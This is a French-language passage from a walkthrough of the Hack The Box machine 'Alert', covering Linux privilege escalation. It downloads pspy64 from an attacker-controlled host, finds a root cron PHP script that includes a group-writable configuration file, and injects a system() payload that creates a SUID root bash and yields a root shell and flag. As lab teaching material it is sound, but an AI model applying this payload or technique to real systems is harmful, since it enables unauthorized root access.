![Interface Website Monitor affichant le suivi en temps réel des sites alert.htb et statistics.alert.htb](website-monitor.png)

En rafraîchissant la page, tu vois que les graphiques évoluent en temps réel : de nouveaux points apparaissent et les valeurs changent.

Cela montre qu’un **processus de monitoring actif** tourne en arrière-plan, probablement via un cron ou un service automatisé.

Le service lui-même n’est pas exploitable directement, mais il révèle la présence d’un mécanisme que tu peux chercher à identifier pour la suite de l’escalade.

### Observation des processus avec pspy64

Pour comprendre quel processus alimente ce monitoring, tu observes l’activité du système en temps réel avec `pspy64`.

Tu le télécharges et l’exécutes depuis le répertoire persistant (`/var/tmp`) :

```bash
cd /var/tmp
wget http://10.10.x.x:8000/pspy64
chmod +x pspy64
./pspy64
```

Extrait simplifié de la sortie `pspy64` :

```bash
16:09:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
[...]
16:10:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
[...]
16:11:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
[...]
16:12:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
[...]
16:13:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
[...]
16:14:01 CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
```

Tu observes que le script `monitor.php` est exécuté automatiquement toutes les minutes avec les privilèges root (UID=0), ce qui en fait une cible prioritaire pour l’escalade de privilèges.

Tu poursuis l’analyse en examinant son contenu.

### Analyse de `monitor.php`

Grâce à `pspy64`, tu identifies un script exécuté régulièrement par root :

```bash
/opt/website-monitor/monitor.php
```

En examinant son contenu, tu identifies la directive d’inclusion suivante :

```bash
include('config/configuration.php');
```

Tu vérifies ensuite les permissions du fichier `config/configuration.php` :

```bash
ls -l /opt/website-monitor/config/configuration.php
-rwxrwxr-x 1 root management ...
```

Ce fichier est modifiable par le groupe `management`, auquel appartient `albert`.

Tu affiches son contenu :

```bash
cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
```

Comme ce fichier est inclus par `monitor.php`, exécuté en root via une tâche cron, **toute modification de son contenu permet d’exécuter du code avec les privilèges root**.

### Conclusion de l’énumération manuelle

Les vérifications classiques (sudo, SUID, capabilities, cron, services) ne révèlent aucune piste exploitable.

L’observation avec `pspy64` met en évidence l’exécution régulière de `/opt/website-monitor/monitor.php` par root.

Ce script constitue le point d’entrée de l’escalade de privilèges : il s’exécute automatiquement avec les privilèges root et utilise un fichier modifiable par l’utilisateur `albert`.

Tu peux donc modifier `configuration.php` afin d’y injecter du code et obtenir un accès root.

### Exploitation

Le fichier `configuration.php` est exécuté par un script lancé en root et modifiable par l’utilisateur `albert`.

Tu peux donc y injecter du code pour exécuter une commande avec les privilèges root.

**Modification de `configuration.php`**

L’objectif est de créer un binaire SUID root pour obtenir un shell privilégié.

Tu modifies le fichier :

```bash
nano /opt/website-monitor/config/configuration.php
```

Et tu ajoutes le payload suivant :

```php
<?php
define('PATH', '/opt/website-monitor');

system('cp /bin/bash /var/tmp/mybashroot; chown root:root /var/tmp/mybashroot; chmod 4755 /var/tmp/mybashroot;');
?>
```

Lors de la sauvegarde, tu observes les messages suivants :

- d'abord un popup 

  <span style="color:red">[File on disk has changed] </span> 

- suivi de :

```txt
File was modified since you opened it; continue saving?
```

Cela indique que le fichier est modifié en continu par un processus externe.

Tu confirmes avec `Y` pour enregistrer tes modifications.

**Exécution du payload**

Au moment où tu enregistres le fichier, un processus exécuté en root lit et modifie ce fichier en continu.

Dans cet intervalle :

- le code injecté est exécuté par le script root
- le fichier `/var/tmp/mybashroot` est créé
- `configuration.php` est restauré automatiquement

Le payload est donc exécuté avant que le fichier ne soit réécrit.

Tu vérifies :

```bash
ls -l /var/tmp/mybashroot
```

**Obtention du shell root**

```bash
/var/tmp/mybashroot -p
```

```bash
mybashroot-5.0# id
uid=1000(albert) gid=1000(albert) euid=0(root) groups=1000(albert),1001(management)
```

Le shell s’exécute avec les privilèges root (`euid=0`).

Tu peux maintenant exécuter des commandes avec les privilèges root.

### Récupération du flag

```bash
mybashroot-5.0# cat /root/root.txt
6276xxxxxxxxxxxxxxxxxxxxxxxxc253
```

Tu confirmes ainsi l’accès root sur la machine.

**Le flag root est récupéré, ce qui marque la fin de l’exploitation.**


---

## Conclusion

La machine **Alert (HTB Easy)** montre comment plusieurs faiblesses simples peuvent s’enchaîner jusqu’à une compromission complète.

Tu commences par exploiter une vulnérabilité web côté application, puis tu t’appuies sur les informations récupérées pour obtenir un accès SSH. À partir de là, une mauvaise gestion des permissions sur un composant de monitoring te permet d’élever tes privilèges jusqu’à root.

Ce type de scénario est fréquent sur Hack The Box Easy :

- une vulnérabilité web accessible
- des identifiants réutilisables
- une escalade de privilèges liée à une mauvaise configuration

L’intérêt principal de cette machine réside dans la méthode : chaque étape reste simple, mais leur enchaînement permet d’aboutir à une compromission complète du système.

Si tu débutes sur Hack The Box, **Alert** est une excellente machine pour t’entraîner à relier énumération, exploitation web, récupération d’identifiants et escalade de privilèges Linux dans une chaîne cohérente.



---

{{< feedback >}}